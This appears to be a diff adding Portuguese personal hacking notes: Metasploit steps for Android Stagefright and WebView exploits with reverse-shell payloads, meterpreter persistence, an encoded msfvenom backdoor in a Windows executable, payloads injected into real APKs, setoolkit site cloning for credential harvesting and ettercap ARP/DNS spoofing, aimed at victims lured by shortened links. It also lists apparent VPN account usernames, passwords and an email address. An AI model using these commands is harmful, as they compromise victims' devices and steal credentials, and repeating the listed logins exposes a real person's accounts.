@@ -1,0 +1,503 @@
+Stagefright
+
+link do video
+
+https://www.youtube.com/watch?v=GhEORSX91IU
+
+
+
+Esse payload é tão importante porque marca a fase em que você da um salto de Talvez Hacker à um Sou Cracker.
+Stagefright é um dos muitos payloads para android. Ele está disponível apartir do msfconsole v4.16.2-dev.
+
+Vamos lá sem mais de longa...
+
+msfconsole
+
+Após entrar verifique sua versão... Se não for essa atualize-o, fechando e digitando:
+apt update, depois apt list --updagrable veja a versão disponibilizada e pronto apt install metasploite-framework
+
+feita a instalação... Digite:
+
+msfconsole
+
+search stagefright (esse comando irá bucar o modo para que você comece a dissecar qualquer payload)
+aconselho pesquisar mais payload, eu mesmo descobri essa vulnerabilidade exclusivamente por acaso.
+
+depois de ver o nome do módulo copie-o
+
+exploit/android/browser/stagefright_mp4_tx3g_64bit
+
+
+aqui é a pegada, eu suspeito que o procedimento que é usado para acionar e usar esse modulo
+possa ser usado durante a criação de todos os payloads. Seguimos
+
+use exploit/android/browser/stagefright_mp4_tx3g_64bit
+
+show options
+
+note que após usarmos um modulo e ver as letras vermelhas, ja podemos setar as opções. Segue..
+
+set SRVHOST ip
+
+setou seu ip, lembrando que ngrok tcp e endereços externos estão valendo também...
+só fique atento ao lance de abrir as portas no caso de conexão externa.
+
+set SRVPORT porta
+
+setou a porta 
+
+set URIPATH /
+
+setou o diretório RAIZ... significa que você vai usar um apk ou biblioteca adm
+
+set PAYLOAD linux/armle/meterpreter/reverse_tcp
+
+set PAYLOAD linux/armle/mettle/reverse_tcp
+
+exploit -j
+
+sessions -l (letra éle neste caso)
+
+nesse video vemos o segundo modo funcionando
+https://www.youtube.com/watch?v=dAZ4W6OkkRk
+
+
+siga o protocolo...
+
+set LHOST ip
+
+este é para o payload
+
+set LPORT porta
+
+porta do payload, e agora inicie o servidor apache2 num outro terminal
+se for usar pra rede externa, aconselho startar ngrok ou no-ip também aliás
+no caso externo o ngrok tcp  ja tem que estar rodando, porque vamos precisar
+do endereço ipfixo e a porta que ele usará no reverse... 
+
+exploit
+
+por fim ele estará usando o apache2 para disponibilizar o payload. Mas atenção
+esse lance do apache2 rodar na mesma máquina que espera a conexão é só para rede interna.
+
+show options
+
+para ver se tudo esta setado corretamente.
+
+show targets
+
+esse comando mostra todos o celulares vulneraveis ao payload setado se corrijida a falha de uft-8 e ascci claro.
+
+Agora antes de mais nada é importante você testar os comandos no msfconsole, criar o payload com o msfvenom...
+e ai sim se não funcionar você faz a correção do código como é mostrado nesse vídeo.
+
+https://www.youtube.com/watch?v=sQnGyIoNjr8
+
+
+no caso do video.. teste se você tem o netcat, se não tiver apt install netcut...
+
+-----------------------------------------------------------------------------------
+
+Android WebView
+
+msfconsole
+
+search webview
+
+use exploit/android/browser/webview_addjavascriptinterface
+
+show options
+
+set URIPATH /
+ou
+set URIPATH Security
+
+exploit
+
+se quiser pode setar as coisas ou não.
+
+ATENÇÃO:
+
+essa servirá para sempre que invadir um shell
+e não tiver root.
+
+após logar no shell com qualquer payload ou exploit...
+e conseguir conexão, mas não conseguir enviar comandos
+faça o seguinte
+
+na sessão shell do android digite
+
+pwd
+>/
+
+ls (se a saida não der o que esperavamos)
+>: <stdin>..: ls: not found
+
+echo path
+
+>path essa será a saida
+
+export PATH=/system/bin:$PATH
+
+
+ls
+
+veremos o que queriamos etc... como eh mostrado nesse video
+https://www.youtube.com/watch?v=3GTNOaD_0YU
+
+dai é só explorar...
+
+A GRANDE VANTEGEM DESSES 2 EXPLOITES, É QUE VOCÊ NÃO PRECISA CONVENCER A VITIMA
+A BAIXAR UM APK... APENAS A CLICAR EM UM LINK... E DEPENDENDO, PODE ATÉ REDIRECIONA-LA
+COM O ZANTI, OU SEJA TEMOS ATAQUES AUTOMATIZADOS.
+
+----------------------------------------------------------------------------------
+
+Veja se esta droga de setar o my ip public em qualquer bosta no apk... e com 
+o port forwarding(servidor virtual) ativo e setado para o ip do seu host funciona algo..
+
+como mostra esse video: https://www.youtube.com/watch?v=ro7HDRO3EOo
+
+aproveitar pra checar esses lances do java... que ele inclui a sua backdoor
+-----------------------------------------------------------------------------------
+
+tornando seu payload persistente.
+
+https://www.youtube.com/watch?v=EVWt4NENK4I
+
+Ao abrir um meterpreter use
+
+run persistence -h
+
+run persistence -U -i 6 -p 4444 -r meuip
+
+>meterpreter
+shutdown
+
+após entrar é só setar novamente todos os comandos apartir do msfconsole e setar
+as configurações informadas no modulo persistence.
+
+--------------------------------------------------------------------------------------
+para saber seu ip externo via linha de comando
+
+sudo curl ifconfig.me
+
+ele usa também
+
+msfvenom -a x86 --platform windows -x /root/test.exe -k -p windows/meterpreter/reverse_tcp lhost=ipexterno 
+lport=portofforwarding -e x86/shikata_ga_nai -i 9 -f exe -o /root/test.exe
+
+/etc/init.d/postgresql start
+
+msfconsole...
+
+encurtador de link 
+
+sendspace
+
+ao entrar a primeira coisa que ele faz é migrar pro processo do explorer
+então
+
+ps
+
+click na aba search da janela.. find... "explorer" find...
+
+migrate numero do processo
+
+run vnc
+
+screenshot
+
+outro terminal
+
+vncviewer
+
+use o ip e a porta da saida do msfconsole vcn.
+
+
+TESTAR run vnc nas proximas invasoes.
+-------------------------------------------------------------------------------------------
+
+CRIANDO IP PUBLICO, serve para site, serve para hackear...
+substitui ngrok, substitui no-ip facil.
+
+https://www.youtube.com/watch?v=pjQygFIHLg4
+
+De graça.
+
+no video mostra também como fazer o setoolkit funcionar...
+
+inicialmente veja qual é sua versão... se não for essa..
+apt update... dai apt list --upgradable e por fim apt install set
+
+nota-se nesse caso usa-se no setoolkit
+
+1,2,3,3 a opção de importar pesonalizada
+
+seta o ip no primeiro item
+
+no segundo seta a partição em que se encontra a pagina da web em html.
+/root/Desktop
+
+no terceiro, sete a url do site clonado.
+
+fim.
+
+------------------------------------------------------------------------------------
+
+Aqui um script muito bom para scan em endereços fixos como sites ip publicos...
+da geo locate de ip dns...
+
+https://www.youtube.com/watch?v=Q8hAjEaAgE8
+
+----------------------------------------------------------------------------------------
+Spyware for attack windows
+
+https://www.youtube.com/watch?v=oTrzee79sOU
+
+----------------------------------------------------------------------------------------
+
+lembretes usar zanti para achar usuarios validos para logins no roteador...
+
+---------------------------------------------------------------------------------------
+
+Payload in IMAGEM indetectavel.... ótimo para windows.
+
+https://www.youtube.com/watch?v=KTkm33xmnFY
+
+esse tutorial é bom de verdade.
+
+----------------------------------------------------------------------------------------
+
+A grande Novidade
+
+Você sempre quis injetar seus payloads em apk prontos para não ficar aquele main activity.
+Você pode usar, msfpayload -x /caminho/do.apk -p android...
+
+bem como deve dar pra fazer com o windows
+
+Você pode usar, msfpayload -x /caminho/do.exe -p windows...
+
+como vemos no video: https://www.youtube.com/watch?v=I2bZbf4DjHM
+
+sabe-se apenas que você deve fazer o download do apk, estar logado no kali como root.
+no video é feito com o facebook lite, mas temos muitos apks.
+
+FIM
+
+______________________________________________________________________________________
+
+que porra de apk é esse https://www.youtube.com/watch?v=ifI89HdVuSU
+
+será que é cao..
+
+o melhor que achei joguinho hacker é o >>Hack Ex<<
+https://www.youtube.com/watch?v=M7aHpbecvjA
+---------------------------------------------------------------------------------------
+
+Persistence BACKDOOR ANDROID COM NULLBYTE
+
+https://null-byte.wonderhowto.com/how-to/create-persistent-back-door-android-using-kali-linux-0161280/
+
+__________________________________________________________________________________________
+
+KALI RELEASE 2018.1 ATTS
+
+apt update && apt full-upgrade
+
+wget -q -O - https://archive.kali.org/archive-key.asc | apt-key add
+
+esse segundo valida o recebimento de atualizacoes via apt update...
+-------------------------------------------------------------------------------------------
+
+REDE EXTERNA COM VPN (PUBLIC IP)
+
+
+1
+
+https://www.kali.org/news/kali-linux-2018-1-release/
+
+wget -q -O - https://archive.kali.org/archive-key.asc | apt-key add
+
+apt update
+
+apt install network-manager-pptp
+
+apt install network-manager-pptp-gnome
+
+o primeiro site que vc vai acessar eh o https://getnada.com/ que eh muito foda
+um correio eletronico que voce nao precisa fazer conta...
+
+https://ipjetable.net/
+
+cole o link acima no campo depois de abrir o proximo link http://free-proxy.xyz/
+
+apos criar a conta, e enviar o email de verificacao, nao abra diretamente o link
+de confirmar a conta... abra pelo free-proxy-xyz
+
+em seguida logue com sua senha....
+
+anote o usuario e senha... e pronto... agora vamos  a configuracao na vpn
+
+Nom d'utilisateur : qza053301
+Mot de passe : 11h6732o26
+
+Nom d'utilisateur : qsw177531
+Mot de passe : 77t6e77k69
+
+essa ultima::::::
+
+Nom d'utilisateur : ffi568593
+Mot de passe : gd67q3j636
+
+ ffi568593
+E-mail: leafar_tosac@outlook.com
+Code de parrainage: DMXLWYJPNNGJKXBM
+
+gateway: pptp.ipjetable.net
+
+durante a configuracao de uma nova conexao vpn.. ative a criptografia de ponta a ponta
+e por fim... 
+
+na hora de digitar a senha.. ative compartilhar senha com cada usuario 2o item...
+e por fim 
+
+ok
+
+add
+
+ligar.
+
+Assim a cada sessao, nao precisarah fazer login, basta ativar a vpn e pronto
+voce esta online na WWW. A unica desvantagem eh que a cada sessao voce terah
+um novo endereco ip externo... como no ngrok... agora para mudar o link... use
+o sendspace ou google shortner para encurtar seu link seja payload ou link
+temperado kkkk... Sinto que estamos em um outro patamar.
+----------------------------------------------------------------------------------------------------------------------------------
+
+Encurtadores de link
+
+1- https://tinyurl.com/
+
+Esse eh muito bom, testei e funciona. Ele abre assim que valida o link.
+
+2- https://bitly.com/ 
+
+Bit.ly eh simplesmente o melhor, mais praico e o mais curto.
+
+sao meus patentes.
+
+-----------------------------------------------------------------------------------------------
+
+Supondo que o problema esteja em /dev/hda1, execute: # e2fsck -y /dev/hda1   e apos terminar a analise e correcao de blocos # reboot
+
+Para lista todas as partições dos HDs de seu computador, digite:
+
+# fdisk -l
+
+Para descobrir as opções do fsck, digite o comando sem argumentos:
+
+# e2fsck
+
+Ou é claro, consulte sua página de manual:
+
+# man fsck
+
+Nota: o fsck suporta vários tipos de sistema de arquivos, daí a explicação para o comando "e2fsck", ele é um alias para o comando "fsck" para sistema de arquivo do tipo ext2, "e2" vem de "extended 2 file system".
+
+Sistema de arquivos ext3
+
+Hoje é muito comum o uso de partições com a nova geração do extended file system, o ext3. Caso sua partição seja desse tipo, ao invés de usar "e2fsck", use:
+
+# fsck.ext3 /dev/hda1
+
+Substitua /dev/hda1 pela partição correta no seu HD. Responda "sim", "yes" ou "y" para todas as perguntas (ou é claro, use "fsck.ext3 -y") e quando terminar reinicialize o micro com reboot e pronto.
+
+Recomendação: não execute o comando fsck em partição montada. 
+
+
+-------------------------------------------------------------------------------------------
+
+Wireshake e Tcpdump... captura de trafego etc... expets e tutoriais
+
+http://docplayer.com.br/49649312-Analise-e-captura-de-trafego-com-wireshark.html
+
+
+MELHORES TUTORIAIS
+
+https://translate.google.com/translate?hl=pt-BR&sl=en&u=https://www.linkedin.com/pulse/how-sniff-password-using-wireshark-tutorial-chetan-pandey&prev=search
+
+
+https://profalansantos.files.wordpress.com/2016/02/captura-e-anc3a1lise-de-trc3a1fego-com-wireshark.pdf
+
+
+-----------------------------------------------------------------------------------------------
+
+exploit openoffice_document_macro
+
+https://www.youtube.com/watch?v=9jWZ_U6okp0
+
+------------------------------------------------------------------------------------------------
+
+payload PHP hack windows 7...10
+
+https://www.youtube.com/watch?v=ba_n79RIKHg
+----------------------------------------------------------------------------------------------
+
+payload shell do windows Administrador com um exploit code em HTML e um unico acesso
+
+https://www.youtube.com/watch?v=b8Pe7RQ0BS4
+
+------------------------------------------------------------------------------------------------
+
+Payload pdf fazendo certinho
+
+https://www.youtube.com/watch?v=A5-mE6RkxEQ
+------------------------------------------------------------------------------------------------
+
+Payload android webview
+
+https://www.youtube.com/watch?v=Hj4AAGBfyZM
+
+------------------------------------------------------------------------------------------------
+tao sonhado Payload em imagem feito no kali.
+
+https://www.youtube.com/watch?v=5D6NE6HBVPQ
+---------------------------------------------------------------------------------------
+
+A exclusao de ZANTI do processo de redirecionamento http assista com calma somente
+para pegar o arquivo editado pelo leke. Redirecionamento http + de trafego com ettercap.
+
+https://www.youtube.com/watch?v=nZW6nzls7vk
+
+
+nano /etc/ettercap/etter.conf
+
+
+#privs
+
+ inserir
+
+ec.. = 0
+ec.. = 0
+
+#Linux
+
+tirar os dois # do iptables
+
+salvar
+
+nano /etc/ettercap/etter.conf
+
+*  A  myip
+
+salvar
+
+Digite :
+
+rode setoolkit credential haverst
+
+ettercap -T -q -M arp -i wlan0 -P dns_spoof ///
+
+ettercap -T -q -M arp -i eth0 -P dns_spoof ///
+
